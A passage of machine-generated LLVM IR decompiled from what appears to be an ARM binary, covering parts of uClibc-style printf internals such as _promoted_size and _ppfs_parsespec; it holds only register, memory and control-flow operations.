  %v4_131f0 = inttoptr i32 %v3_131f0 to i32*
  %v5_131f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_131f0, i32* %v4_131f0, align 4
  br label %dec_label_pc_13234

dec_label_pc_131f8:                               ; preds = %dec_label_pc_131b8, %dec_label_pc_131b8, %dec_label_pc_13198, %dec_label_pc_131ac, %dec_label_pc_1318c
  %v1_131f8 = inttoptr i32 %v3_13184 to i32*
  %v2_131f8 = load i32, i32* %v1_131f8, align 4
  store i32 %v2_131f8, i32* %r2.global-to-local, align 4
  %v1_131fc = add i32 %v3_13184, 4
  store i32 %v1_131fc, i32* %r3.global-to-local, align 4
  store i32 %v1_131fc, i32* %v2_13184, align 4
  %v0_13204 = load i32, i32* %r2.global-to-local, align 4
  %v1_13204 = load i32, i32* %ip.global-to-local, align 4
  %v2_13204 = inttoptr i32 %v1_13204 to i32*
  store i32 %v0_13204, i32* %v2_13204, align 4
  br label %dec_label_pc_13234

dec_label_pc_1320c:                               ; preds = %dec_label_pc_131a4, %dec_label_pc_131dc
  %v3_1320c = load i32, i32* %v2_13184, align 4
  store i32 %v3_1320c, i32* %r2.global-to-local, align 4
  %v1_13210 = add i32 %v3_1320c, 8
  store i32 %v1_13210, i32* %r3.global-to-local, align 4
  store i32 %v1_13210, i32* %v2_13184, align 4
  %v0_13218 = load i32, i32* %r2.global-to-local, align 4
  %v1_13218 = inttoptr i32 %v0_13218 to i32*
  %v2_13218 = load i32, i32* %v1_13218, align 4
  store i32 %v2_13218, i32* %r3.global-to-local, align 4
  %v3_13218 = add i32 %v0_13218, 4
  %v4_13218 = inttoptr i32 %v3_13218 to i32*
  %v5_13218 = load i32, i32* %v4_13218, align 4
  store i32 %v5_13218, i32* %r4.global-to-local, align 4
  %v0_1321c = load i32, i32* %ip.global-to-local, align 4
  %v1_1321c = inttoptr i32 %v0_1321c to i32*
  store i32 %v2_13218, i32* %v1_1321c, align 4
  %v3_1321c = add i32 %v0_1321c, 4
  %v4_1321c = inttoptr i32 %v3_1321c to i32*
  %v5_1321c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1321c, i32* %v4_1321c, align 4
  br label %dec_label_pc_13234

dec_label_pc_13224:                               ; preds = %dec_label_pc_131b8, %dec_label_pc_131a4, %dec_label_pc_13198, %dec_label_pc_131dc
  %v1_13224 = add i32 %v3_13184, 4
  store i32 %v1_13224, i32* %r3.global-to-local, align 4
  store i32 %v1_13224, i32* %v2_13184, align 4
  %v0_1322c = load i32, i32* %r1.global-to-local, align 4
  %v1_1322c = inttoptr i32 %v0_1322c to i32*
  %v2_1322c = load i32, i32* %v1_1322c, align 4
  store i32 %v2_1322c, i32* %r3.global-to-local, align 4
  %v1_13230 = load i32, i32* %ip.global-to-local, align 4
  %v2_13230 = inttoptr i32 %v1_13230 to i32*
  store i32 %v2_1322c, i32* %v2_13230, align 4
  br label %dec_label_pc_13234

dec_label_pc_13234:                               ; preds = %dec_label_pc_1320c, %dec_label_pc_131f8, %dec_label_pc_131e4, %dec_label_pc_13224
  %v0_13234 = load i32, i32* %ip.global-to-local, align 4
  %v1_13234 = add i32 %v0_13234, 8
  store i32 %v1_13234, i32* %ip.global-to-local, align 4
  %v0_13238.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1323c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13238

dec_label_pc_13238:                               ; preds = %dec_label_pc_13174, %dec_label_pc_13234
  %v0_1323c = phi i32 [ %v0_1323c25, %dec_label_pc_13174 ], [ %v0_1323c.pre, %dec_label_pc_13234 ]
  %v0_13238 = phi i32 [ %v1_1317424, %dec_label_pc_13174 ], [ %v0_13238.pre, %dec_label_pc_13234 ]
  %v1_13238 = add i32 %v0_13238, 1
  store i32 %v1_13238, i32* %lr.global-to-local, align 4
  %v1_1323c = add i32 %v0_1323c, 28
  %v2_1323c = inttoptr i32 %v1_1323c to i32*
  %v3_1323c = load i32, i32* %v2_1323c, align 4
  store i32 %v3_1323c, i32* %r3.global-to-local, align 4
  %v5_13244 = icmp slt i32 %v1_13238, %v3_1323c
  br i1 %v5_13244, label %dec_label_pc_13174, label %dec_label_pc_1323c.dec_label_pc_13248.loopexit_crit_edge

dec_label_pc_1324c:                               ; preds = %entry
  br i1 %v6_13128, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1324c
  %v2_13250 = add i32 %v0_13110, 36
  %v3_13250 = inttoptr i32 %v2_13250 to i8*
  %v4_13250 = load i8, i8* %v3_13250, align 1
  %v5_13250 = zext i8 %v4_13250 to i32
  %v5_13254 = mul nuw nsw i32 %v5_13250, 8
  %v6_13254 = add i32 %v5_13254, %v1_1311c
  store i32 %v6_13254, i32* %r3.global-to-local, align 4
  %v2_13258 = add i32 %v6_13254, -8
  %v3_13258 = inttoptr i32 %v2_13258 to i32*
  %v4_13258 = load i32, i32* %v3_13258, align 4
  store i32 %v4_13258, i32* %r3.global-to-local, align 4
  store i32 %v4_13258, i32* %v2_13120, align 4
  %v0_13260.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1324c, %bb
  %v2_13274 = phi i32 [ %v0_13260.pre, %bb ], [ %v0_13110, %dec_label_pc_1324c ]
  %v1_13260 = add i32 %v2_13274, 4
  %v2_13260 = inttoptr i32 %v1_13260 to i32*
  %v3_13260 = load i32, i32* %v2_13260, align 4
  store i32 %v3_13260, i32* %r3.global-to-local, align 4
  %v6_13264 = icmp eq i32 %v3_13260, -2147483648
  br i1 %v6_13264, label %bb15, label %dec_label_pc_13248

bb15:                                             ; preds = %.thread2
  %v2_13268 = add i32 %v2_13274, 37
  %v3_13268 = inttoptr i32 %v2_13268 to i8*
  %v4_13268 = load i8, i8* %v3_13268, align 1
  %v5_13268 = zext i8 %v4_13268 to i32
  %v1_1326c = load i32, i32* %ip.global-to-local, align 4
  %v5_1326c = mul nuw nsw i32 %v5_13268, 8
  %v6_1326c = add i32 %v5_1326c, %v1_1326c
  store i32 %v6_1326c, i32* %r3.global-to-local, align 4
  %v2_13270 = add i32 %v6_1326c, -8
  %v3_13270 = inttoptr i32 %v2_13270 to i32*
  %v4_13270 = load i32, i32* %v3_13270, align 4
  store i32 %v4_13270, i32* %r3.global-to-local, align 4
  store i32 %v4_13270, i32* %v2_13260, align 4
  %v0_13278.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13248

dec_label_pc_1323c.dec_label_pc_13248.loopexit_crit_edge: ; preds = %dec_label_pc_13238
  br label %dec_label_pc_13248.loopexit

dec_label_pc_13248.loopexit:                      ; preds = %dec_label_pc_1323c.dec_label_pc_13248.loopexit_crit_edge, %dec_label_pc_1316c
  %v0_1323c.lcssa = phi i32 [ %v0_1323c, %dec_label_pc_1323c.dec_label_pc_13248.loopexit_crit_edge ], [ %v0_1323c18, %dec_label_pc_1316c ]
  br label %dec_label_pc_13248

dec_label_pc_13248:                               ; preds = %dec_label_pc_13248.loopexit, %.thread2, %bb15
  %v1_13298 = phi i32 [ %v0_1323c.lcssa, %dec_label_pc_13248.loopexit ], [ %v2_13274, %.thread2 ], [ %v0_13278.pre, %bb15 ]
  %v1_13278 = add i32 %v1_13298, 8
  %v2_13278 = inttoptr i32 %v1_13278 to i32*
  %v3_13278 = load i32, i32* %v2_13278, align 4
  store i32 %v3_13278, i32* %r1.global-to-local, align 4
  %v1_1327c = icmp slt i32 %v3_13278, 0
  br i1 %v1_1327c, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_13248
  %v5_13280 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_13280, i32* @r4, align 4
  ret i32 %v1_13298

bb17:                                             ; preds = %dec_label_pc_13248
  %v1_13284 = add i32 %v1_13298, 16
  %v2_13284 = inttoptr i32 %v1_13284 to i32*
  %v3_13284 = load i32, i32* %v2_13284, align 4
  %v1_1328c = sub i32 0, %v3_13278
  store i32 %v1_1328c, i32* %r1.global-to-local, align 4
  %v1_13288 = and i32 %v3_13284, -10
  %v1_13290 = or i32 %v1_13288, 8
  store i32 %v1_13290, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_13298 = add i32 %v1_13298, 20
  %v3_13298 = inttoptr i32 %v2_13298 to i32*
  store i32 32, i32* %v3_13298, align 4
  %v0_1329c = load i32, i32* %r1.global-to-local, align 4
  %v1_1329c = load i32, i32* @r0, align 4
  %v2_1329c = add i32 %v1_1329c, 8
  %v3_1329c = inttoptr i32 %v2_1329c to i32*
  store i32 %v0_1329c, i32* %v3_1329c, align 4
  %v0_132a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_132a0 = load i32, i32* @r0, align 4
  %v2_132a0 = add i32 %v1_132a0, 16
  %v3_132a0 = inttoptr i32 %v2_132a0 to i32*
  store i32 %v0_132a0, i32* %v3_132a0, align 4
  %v2_132a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_132a4, i32* @r4, align 4
  %v8_132a4 = load i32, i32* @r0, align 4
  ret i32 %v8_132a4

; uselistorder directives
  uselistorder i32 %v1_13238, { 2, 1, 0 }
  uselistorder i32 %v0_1323c, { 1, 2, 0 }
  uselistorder i32 %v3_13184, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_13184, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_13178, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_1317424, { 1, 0 }
  uselistorder i32 %v0_1323c18, { 2, 0, 1 }
  uselistorder i32 %v0_13110, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_13248, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_13238, { 1, 0 }
  uselistorder label %dec_label_pc_13234, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13224, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1320c, { 1, 0 }
  uselistorder label %dec_label_pc_131f8, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_13174, { 1, 0 }
  uselistorder label %dec_label_pc_1316c, { 1, 0 }
  uselistorder label %dec_label_pc_13148, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_132c4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_132b0

dec_label_pc_132b0:                               ; preds = %dec_label_pc_132cc, %entry
  %v0_132b0 = phi i32 [ %v1_132b0, %dec_label_pc_132cc ], [ ptrtoint (i32* @global_var_23f7c.1055 to i32), %entry ]
  %v1_132b0 = add i32 %v0_132b0, -2
  %v1_132b4 = add i32 %v0_132b0, -1
  %v2_132b4 = inttoptr i32 %v1_132b4 to i8*
  %v3_132b4 = load i8, i8* %v2_132b4, align 1
  %v4_132b4 = zext i8 %v3_132b4 to i32
  %v1_132b8 = inttoptr i32 %v1_132b0 to i8*
  %v2_132b8 = load i8, i8* %v1_132b8, align 2
  %v3_132b8 = zext i8 %v2_132b8 to i32
  %v3_132bc = mul nuw i32 %v4_132b4, 16777216
  %v4_132c0 = sdiv i32 %v3_132bc, 65536
  %v5_132c0 = or i32 %v4_132c0, %v3_132b8
  %v9_132c4 = icmp eq i32 %v5_132c0, %v1_132c4.pre
  br i1 %v9_132c4, label %dec_label_pc_132b0.dec_label_pc_132d8_crit_edge, label %dec_label_pc_132cc

dec_label_pc_132b0.dec_label_pc_132d8_crit_edge:  ; preds = %dec_label_pc_132b0
  br label %dec_label_pc_132d8

dec_label_pc_132cc:                               ; preds = %dec_label_pc_132b0
  %tmp = icmp ugt i32 %v1_132b0, ptrtoint (i32* @global_var_23f64.1057 to i32)
  br i1 %tmp, label %dec_label_pc_132b0, label %dec_label_pc_132d8

dec_label_pc_132d8:                               ; preds = %dec_label_pc_132cc, %dec_label_pc_132b0.dec_label_pc_132d8_crit_edge
  %v2_132e0.pre-phi = sub i32 %v1_132b0, ptrtoint (i32* @global_var_23f64.1057 to i32)
  store i32 ptrtoint (i32* @global_var_23f7c.1055 to i32), i32* @r2, align 4
  %v4_132e4 = sdiv i32 %v2_132e0.pre-phi, 2
  %v5_132e4 = add i32 %v4_132e4, ptrtoint (i32* @global_var_23f7c.1055 to i32)
  %v6_132e4 = inttoptr i32 %v5_132e4 to i8*
  %v7_132e4 = load i8, i8* %v6_132e4, align 1
  %v9_132e4 = zext i8 %v7_132e4 to i32
  ret i32 %v9_132e4

; uselistorder directives
  uselistorder i32 %v1_132b0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_132b0, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_23f7c.1055 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_132f8 = load i32, i32* @r4, align 4
  store i32 %v3_132f8, i32* %stack_var_-32, align 4
  %v6_132f8 = load i32, i32* @r5, align 4
  %v25_132f8 = ptrtoint i32* %stack_var_-32 to i32
  %v1_132fc = add i32 %tmp, 16
  %v2_132fc = inttoptr i32 %v1_132fc to i32*
  %v3_132fc = load i32, i32* %v2_132fc, align 4
  %v2_13300 = ptrtoint i32* %stack_var_-88 to i32
  %v1_13304 = and i32 %v3_132fc, 128
  store i32 %v1_13304, i32* @r4, align 4
  %v2_13304 = icmp eq i32 %v1_13304, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_13324 = add i32 %tmp, 24
  %v2_13324 = inttoptr i32 %v1_13324 to i32*
  %v3_13324 = load i32, i32* %v2_13324, align 4
  store i32 %v3_13324, i32* %sb.global-to-local, align 4
  br i1 %v2_13304, label %bb, label %dec_label_pc_13344

bb:                                               ; preds = %entry
  %v3_13328 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_13390

dec_label_pc_13334:                               ; preds = %dec_label_pc_13514
  %v0_13334 = load i32, i32* %r0.global-to-local, align 4
  %v0_13544.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1353c

dec_label_pc_1333c:                               ; preds = %dec_label_pc_13540
  %v1_1333c = add i32 %v0_13544.pre, 1
  store i32 %v1_1333c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1355c

dec_label_pc_13344:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13348

dec_label_pc_13348:                               ; preds = %dec_label_pc_1337c.dec_label_pc_13348_crit_edge, %dec_label_pc_13344
  %v1_13358 = phi i32 [ %v1_1336c, %dec_label_pc_1337c.dec_label_pc_13348_crit_edge ], [ 0, %dec_label_pc_13344 ]
  %v0_13348 = phi i32 [ %v0_13348.pre, %dec_label_pc_1337c.dec_label_pc_13348_crit_edge ], [ %tmp, %dec_label_pc_13344 ]
  %v1_13348 = inttoptr i32 %v0_13348 to i32*
  %v2_13348 = load i32, i32* %v1_13348, align 4
  %v4_1334c = mul i32 %v1_13358, 4
  %v5_1334c = add i32 %v2_13348, %v4_1334c
  store i32 %v5_1334c, i32* %r3.global-to-local, align 4
  %v1_13350 = add i32 %v5_1334c, -4
  %v2_13350 = inttoptr i32 %v1_13350 to i32*
  %v3_13350 = load i32, i32* %v2_13350, align 4
  store i32 %v3_13350, i32* %r1.global-to-local, align 4
  store i32 %v25_132f8, i32* %ip.global-to-local, align 4
  %v2_13358 = add i32 %v1_13358, %v25_132f8
  store i32 %v2_13358, i32* %r2.global-to-local, align 4
  %v1_1335c = trunc i32 %v3_13350 to i8
  %v3_1335c = add i32 %v2_13358, -56
  %v4_1335c = inttoptr i32 %v3_1335c to i8*
  store i8 %v1_1335c, i8* %v4_1335c, align 1
  %v0_13360 = load i32, i32* %r2.global-to-local, align 4
  %v1_13360 = add i32 %v0_13360, -56
  %v2_13360 = inttoptr i32 %v1_13360 to i8*
  %v3_13360 = load i8, i8* %v2_13360, align 1
  %v4_13360 = zext i8 %v3_13360 to i32
  store i32 %v4_13360, i32* %r2.global-to-local, align 4
  %v0_13364 = load i32, i32* %r3.global-to-local, align 4
  %v1_13364 = add i32 %v0_13364, -4
  %v2_13364 = inttoptr i32 %v1_13364 to i32*
  %v3_13364 = load i32, i32* %v2_13364, align 4
  store i32 %v3_13364, i32* %r3.global-to-local, align 4
  %v9_13368 = icmp eq i32 %v4_13360, %v3_13364
  %v0_1336c = load i32, i32* %r0.global-to-local, align 4
  %v1_1336c = add i32 %v0_1336c, 1
  store i32 %v1_1336c, i32* %r0.global-to-local, align 4
  br i1 %v9_13368, label %dec_label_pc_13374, label %dec_label_pc_1378c

dec_label_pc_13374:                               ; preds = %dec_label_pc_13348
  %v2_13374 = icmp eq i8 %v3_13360, 0
  br i1 %v2_13374, label %dec_label_pc_13384, label %dec_label_pc_1337c

dec_label_pc_1337c:                               ; preds = %dec_label_pc_13374
  %tmp166 = icmp ult i32 %v1_1336c, 32
  br i1 %tmp166, label %dec_label_pc_1337c.dec_label_pc_13348_crit_edge, label %dec_label_pc_13384

dec_label_pc_1337c.dec_label_pc_13348_crit_edge:  ; preds = %dec_label_pc_1337c
  %v0_13348.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13348

dec_label_pc_13384:                               ; preds = %dec_label_pc_1337c, %dec_label_pc_13374
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1338c = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_13390

dec_label_pc_13390:                               ; preds = %bb, %dec_label_pc_13384
  %storemerge102 = phi i32 [ %v2_1338c, %dec_label_pc_13384 ], [ %v3_13328, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_133a0

dec_label_pc_1339c:                               ; preds = %.thread22, %dec_label_pc_134ac
  %v0_1339c = phi i32 [ %v2_13524, %.thread22 ], [ %storemerge105, %dec_label_pc_134ac ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_134ac ]
  store i32 %v0_1339c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_133a0

dec_label_pc_133a0:                               ; preds = %dec_label_pc_13390, %dec_label_pc_1339c
  %v1_133bc = phi i32 [ %storemerge102, %dec_label_pc_13390 ], [ %v0_1339c, %dec_label_pc_1339c ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_13390 ], [ %stack_var_-48.0, %dec_label_pc_1339c ]
  %v1_133a0 = inttoptr i32 %v1_133bc to i8*
  %v2_133a0 = load i8, i8* %v1_133a0, align 1
  %v3_133a0 = zext i8 %v2_133a0 to i32
  store i32 %v3_133a0, i32* %r3.global-to-local, align 4
  %v7_133a4 = icmp eq i8 %v2_133a0, 42
  br i1 %v7_133a4, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_133a0
  store i32 %v1_133bc, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_133a0
  %v1_133b0 = load i32, i32* @lr, align 4
  %v4_133b0 = mul i32 %v1_133b0, -4
  %v5_133b0 = add i32 %v4_133b0, %v25_132f8
  store i32 %v5_133b0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_133bc = add i32 %v1_133bc, 1
  store i32 %v2_133bc, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_133c4 = add i32 %v5_133b0, -12
  %v4_133c4 = inttoptr i32 %v3_133c4 to i32*
  store i32 0, i32* %v4_133c4, align 4
  %v0_133e8.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_133e8.pre = phi i32 [ %v0_133e8.pre.pre, %bb124 ], [ %v1_133bc, %.thread9.thread ]
  %v2_133ec.pre = load i32, i32* @global_var_2d288, align 4
  br label %.backedge

dec_label_pc_133cc:                               ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_133d0 = load i32, i32* %r0.global-to-local, align 4
  %v7_133d4 = icmp sgt i32 %v0_133d0, 4094
  br i1 %v7_133d4, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_133cc
  %v1_133dc14 = add i32 %v0_13460, 1
  store i32 %v1_133dc14, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_133cc
  %v11_133d8 = mul i32 %v0_133d0, 10
  %v12_133d8 = add i32 %v11_133d8, %v3_133e8
  store i32 %v12_133d8, i32* %r3.global-to-local, align 4
  %v1_133dc = add i32 %v0_13460, 1
  store i32 %v1_133dc, i32* %r6.global-to-local, align 4
  %v9_133e0 = add i32 %v12_133d8, -48
  store i32 %v9_133e0, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_13460 = phi i32 [ %v0_133e8.pre, %.preheader ], [ %v1_133dc, %bb126 ], [ %v1_133dc14, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_2d288 to i32), i32* %r3.global-to-local, align 4
  %v1_133e8 = inttoptr i32 %v0_13460 to i8*
  %v2_133e8 = load i8, i8* %v1_133e8, align 1
  %v3_133e8 = zext i8 %v2_133e8 to i32
  store i32 %v3_133e8, i32* %r2.global-to-local, align 4
  store i32 %v2_133ec.pre, i32* %r3.global-to-local, align 4
  %v3_133f0 = mul nuw nsw i32 %v3_133e8, 2
  %v4_133f0 = add i32 %v3_133f0, %v2_133ec.pre
  %v5_133f0 = inttoptr i32 %v4_133f0 to i8*
  %v6_133f0 = load i8, i8* %v5_133f0, align 1
  %v8_133f0 = zext i8 %v6_133f0 to i32
  store i32 %v8_133f0, i32* %r3.global-to-local, align 4
  %v1_133f4 = and i32 %v8_133f0, 8
  %v2_133f4 = icmp eq i32 %v1_133f4, 0
  br i1 %v2_133f4, label %dec_label_pc_133fc, label %dec_label_pc_133cc

dec_label_pc_133fc:                               ; preds = %.backedge
  %v0_133fc = load i32, i32* %r1.global-to-local, align 4
  %v1_133fc = add i32 %v0_133fc, -1
  %v2_133fc = inttoptr i32 %v1_133fc to i8*
  %v3_133fc = load i8, i8* %v2_133fc, align 1
  %v4_133fc = zext i8 %v3_133fc to i32
  store i32 %v4_133fc, i32* %r3.global-to-local, align 4
  %v7_13400 = icmp eq i8 %v3_133fc, 37
  br i1 %v7_13400, label %dec_label_pc_13408, label %dec_label_pc_134c4

dec_label_pc_13408:                               ; preds = %dec_label_pc_133fc
  %v7_13408 = icmp eq i8 %v2_133e8, 36
  %. = zext i1 %v7_13408 to i32
  store i32 %., i32* %ip.global-to-local, align 4
  %v0_13414 = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_13414, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_13408
  store i32 0, i32* %ip.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_13408, %bb130
  %v1_13470 = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_13408 ]
  %v2_1341c = icmp eq i32 %v1_13470, 0
  %v0_1344c = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_1341c, label %dec_label_pc_1344c, label %dec_label_pc_13424

dec_label_pc_13424:                               ; preds = %thread-pre-split
  %v2_1344c = icmp eq i32 %v0_1344c, 0
  %v1_13428 = add i32 %v0_13460, 1
  store i32 %v1_13428, i32* %r1.global-to-local, align 4
  br i1 %v2_1344c, label %dec_label_pc_1378c, label %dec_label_pc_13430

dec_label_pc_13430:                               ; preds = %dec_label_pc_13424
  %v2_13430 = sub i32 %v0_13414, %v0_1344c
  %v4_13430 = xor i32 %v0_1344c, %v0_13414
  %v5_13430 = xor i32 %v2_13430, %v0_13414
  %v6_13430 = and i32 %v5_13430, %v4_13430
  %v7_13430 = icmp slt i32 %v6_13430, 0
  %v8_13430 = icmp slt i32 %v2_13430, 0
  %v9_13430 = icmp eq i32 %v0_13414, %v0_1344c
  %v3_13434 = xor i1 %v8_13430, %v7_13430
  %v4_13434 = or i1 %v9_13430, %v3_13434
  br i1 %v4_13434, label %dec_label_pc_13444, label %bb131

bb131:                                            ; preds = %dec_label_pc_13430
  store i32 %v0_13414, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13444

dec_label_pc_13440:                               ; preds = %dec_label_pc_13460, %dec_label_pc_13468
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13444

dec_label_pc_13444:                               ; preds = %bb131, %dec_label_pc_13430, %dec_label_pc_13440
  %v0_13444 = phi i32 [ %v0_133fc, %dec_label_pc_13440 ], [ %v1_13428, %dec_label_pc_13430 ], [ %v1_13428, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_13440 ], [ %v0_13414, %dec_label_pc_13430 ], [ %v0_13414, %bb131 ]
  br label %dec_label_pc_1347c

dec_label_pc_1344c:                               ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_1344c, 1
  br i1 %tmp132, label %dec_label_pc_13460, label %dec_label_pc_13454

dec_label_pc_13454:                               ; preds = %dec_label_pc_1344c
  %v7_13454 = icmp eq i8 %v2_133e8, 109
  br i1 %v7_13454, label %dec_label_pc_134c4, label %dec_label_pc_1378c

dec_label_pc_13460:                               ; preds = %dec_label_pc_1344c
  %tmp167 = icmp ugt i32 %v0_13460, %v0_133fc
  br i1 %tmp167, label %dec_label_pc_13468, label %dec_label_pc_13440

dec_label_pc_13468:                               ; preds = %dec_label_pc_13460
  %v1_13468 = inttoptr i32 %v0_133fc to i8*
  %v2_13468 = load i8, i8* %v1_13468, align 1
  %v3_13468 = zext i8 %v2_13468 to i32
  store i32 %v3_13468, i32* %r3.global-to-local, align 4
  %v7_1346c = icmp eq i8 %v2_13468, 48
  br i1 %v7_1346c, label %dec_label_pc_13440, label %bb133

bb133:                                            ; preds = %dec_label_pc_13468
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_134c4

dec_label_pc_1347c.loopexit:                      ; preds = %dec_label_pc_13484
  %v1_13490 = load i32, i32* @r4, align 4
  %v3_13490 = or i32 %v1_13490, %v0_134a4
  store i32 %v3_13490, i32* @r4, align 4
  %v2_13494 = add i32 %storemerge105, 1
  br label %dec_label_pc_1347c

dec_label_pc_1347c:                               ; preds = %dec_label_pc_1347c.loopexit, %dec_label_pc_13444
  %storemerge105 = phi i32 [ %v0_13444, %dec_label_pc_13444 ], [ %v2_13494, %dec_label_pc_1347c.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_23f5c.1062 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_13488 = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_13484

dec_label_pc_13484:                               ; preds = %dec_label_pc_1349c, %dec_label_pc_1347c
  %v0_134a4 = phi i32 [ %v2_134a4, %dec_label_pc_1349c ], [ 1, %dec_label_pc_1347c ]
  %v0_13484 = phi i32 [ %v5_13484, %dec_label_pc_1349c ], [ ptrtoint ([8 x i8]* @global_var_23f5c.1062 to i32), %dec_label_pc_1347c ]
  %v1_13484 = inttoptr i32 %v0_13484 to i8*
  %v2_13484 = load i8, i8* %v1_13484, align 1
  %v3_13484 = zext i8 %v2_13484 to i32
  store i32 %v3_13484, i32* %r2.global-to-local, align 4
  %v5_13484 = add i32 %v0_13484, 1
  store i32 %v5_13484, i32* %r1.global-to-local, align 4
  %v2_13488 = load i8, i8* %v1_13488, align 1
  %v3_13488 = zext i8 %v2_13488 to i32
  store i32 %v3_13488, i32* %r3.global-to-local, align 4
  %v9_1348c = icmp eq i8 %v2_13488, %v2_13484
  br i1 %v9_1348c, label %dec_label_pc_1347c.loopexit, label %dec_label_pc_1349c

dec_label_pc_1349c:                               ; preds = %dec_label_pc_13484
  %v1_1349c = inttoptr i32 %v5_13484 to i8*
  %v2_1349c = load i8, i8* %v1_1349c, align 1
  %v3_1349c = zext i8 %v2_1349c to i32
  store i32 %v3_1349c, i32* %r3.global-to-local, align 4
  %v2_134a0 = icmp eq i8 %v2_1349c, 0
  %v2_134a4 = mul i32 %v0_134a4, 2
  store i32 %v2_134a4, i32* %r0.global-to-local, align 4
  br i1 %v2_134a0, label %dec_label_pc_134ac, label %dec_label_pc_13484

dec_label_pc_134ac:                               ; preds = %dec_label_pc_1349c
  %v1_134ac = add i32 %storemerge105, -1
  %v2_134ac = inttoptr i32 %v1_134ac to i8*
